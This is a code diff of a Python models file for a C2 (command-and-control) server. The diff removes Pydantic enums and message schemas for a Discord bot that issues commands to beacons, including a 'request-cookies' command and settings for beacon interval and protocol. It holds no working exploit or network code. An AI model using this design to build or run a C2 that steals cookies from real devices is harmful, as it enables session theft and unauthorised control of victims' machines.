@@ -1,58 +1,13 @@
 """
 Pydantic models for the C2 server.
-Defines the data structures exchanged between the bot, server, and beacon.
+Defines the data structures exchanged between the server and beacon.
 """
 
 from datetime import datetime, timezone
-from enum import Enum
 from typing import Any
 from uuid import uuid4
 
 from pydantic import BaseModel, Field
-
-
-# ---------------------------------------------------------------------------
-# Enums
-# ---------------------------------------------------------------------------
-
-class CommandType(str, Enum):
-    """Supported command types sent from the Discord bot."""
-    SHOW_DEVICES = "show-devices"
-    REQUEST_COOKIES = "request-cookies"
-    SET_BEACON_INTERVAL = "set-beacon-interval"
-    SET_COMMUNICATION_PROTOCOL = "set-communication-protocol"
-
-
-class ResponseStatus(str, Enum):
-    """Status of a command response."""
-    SUCCESS = "success"
-    ERROR = "error"
-
-
-# ---------------------------------------------------------------------------
-# Message Queue models (bot ↔ server)
-# ---------------------------------------------------------------------------
-
-class CommandMessage(BaseModel):
-    """A command message sent from the Discord bot to the server."""
-    request_id: str = Field(default_factory=lambda: str(uuid4()))
-    command: CommandType
-    args: dict[str, Any] = Field(default_factory=dict)
-    timestamp: datetime = Field(
-        default_factory=lambda: datetime.now(timezone.utc)
-    )
-
-
-class ResponseMessage(BaseModel):
-    """A response message sent from the server back to the Discord bot."""
-    request_id: str
-    command: CommandType
-    status: ResponseStatus
-    data: dict[str, Any] = Field(default_factory=dict)
-    message: str = ""
-    timestamp: datetime = Field(
-        default_factory=lambda: datetime.now(timezone.utc)
-    )
 
 
 # ---------------------------------------------------------------------------
